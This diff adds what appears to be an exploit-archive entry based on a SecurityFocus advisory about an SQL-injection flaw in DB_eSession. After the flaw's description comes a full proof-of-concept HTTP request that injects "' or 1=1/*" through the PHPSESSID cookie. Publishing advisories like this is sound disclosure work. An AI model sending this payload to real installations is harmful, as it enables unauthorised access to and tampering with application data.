@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/16598/info
+
+DB_eSession is prone to an SQL-injection vulnerability. The application fails to properly sanitize user-supplied input before using it in an SQL query. 
+
+Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+GET http://www.example.com/index.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0
+Accept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Cookie: PHPSESSID=143263645564654563456345634563435%00' or 1=1/*
